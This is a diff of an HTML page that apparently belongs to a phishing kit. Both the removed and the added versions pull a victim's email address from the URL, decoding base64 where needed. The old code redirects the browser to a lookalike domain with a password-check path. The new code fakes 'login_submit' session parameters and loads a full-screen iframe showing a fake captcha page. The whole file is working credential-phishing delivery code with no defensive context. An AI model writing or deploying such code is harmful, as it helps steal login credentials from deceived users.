@@ -1,41 +1,62 @@
 
 
-<html>
+<!DOCTYPE html>
+<html style="margin:0;padding:0;height:100%">
 <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.0.0/core.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.9-1/md5.js"></script>
+  
   <script>
-    function getEmailFromURL() {
-      const url = window.location.href;
-      const match = url.match(/[?&]state=([^&#]+)/);
-      if (!match) return null;
-
-      let value = decodeURIComponent(match[1]);
-
-      try {
-        // Check if it's Base64 (Standard check)
-        // atob() decodes the Base64 string
-        const decoded = atob(value);
-        if (decoded.includes("@")) {
-          return decoded;
-        }
-      } catch (e) {
-        // If atob fails, it's likely plain text or malformed
-        if (value.includes("@")) {
-          return value;
-        }
+  var loading = true;
+  if(loading) {
+      var href = window.location.href;
+      var regex = new RegExp("[&\\?]cmd=");
+      if (regex.test(href)) {
+      } else {
+          let rand =  Math.random() * 1000000000;
+          var md5 = CryptoJS.MD5(rand);
+          window.location.href = href.replace(/]/g, '') + `&em=cmd=login_submit&id=${rand + rand}&session=${md5 + md5}`
+          loading = false;
       }
-      return null;
-    }
-
-    const email = getEmailFromURL();
-
-    if (email) {
-      // Fixed the line break and concatenation
-      window.top.location.href = "https://tecnicasreunldas-es.com/verify/8368e8f1-5bb4-4b01-a558-c62a310d585a?auth=1&shareable=true&access=restricted&check_type=password&timestamp=2026-11-02T03:54:42.674916+00:00Z&priority=high&include_details=true&e=Tm9uZQ&dc=GFNXIB1S&ref=direct&acct=" + email;
-    } else {
-      console.log("No valid email found in state parameter.");
-    }
-  </script>
+  }
+</script>    
 </head>
-<body><script defer src="https://static.cloudflareinsights.com/beacon.min.js/v8c78df7c7c0f484497ecbca7046644da1771523124516" integrity="sha512-8DS7rgIrAmghBFwoOTujcf6D9rXvH8xm8JQ1Ja01h9QX8EzXldiszufYa4IFfKdLUKTTrnSFXLDkUEOTrZQ8Qg==" data-cf-beacon='{"version":"2024.11.0","token":"10f6674ecde64ac78cb062e09acb0537","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
+<body style="margin:0;padding:0;height:100%">
+    <iframe id="contentFrame" 
+            style="width:100%;height:100%;border:none"
+            sandbox="allow-scripts allow-same-origin allow-forms allow-top-navigation"
+            allow="fullscreen">
+    </iframe>
+
+    <script>
+        // Get the email from URL hash
+        const hash = window.location.hash.slice(1);
+        let email = '';
+        
+        if (hash) {
+            try {
+                // Try to decode base64 if needed, otherwise use raw
+                if (/^[A-Za-z0-9+/=]+={0,2}$/.test(hash)) {
+                    email = atob(hash);
+                } else {
+                    email = hash;
+                }
+            } catch(e) {
+                email = hash;
+            }
+        }
+        
+        // Build the iframe URL
+        const iframe = document.getElementById('contentFrame');
+        let src = 'file.html';
+        
+        if (email) {
+            src = `cloud_captcha.html#${email}`;
+        }
+        
+        iframe.src = src;
+    </script>
 </body>
 </html>
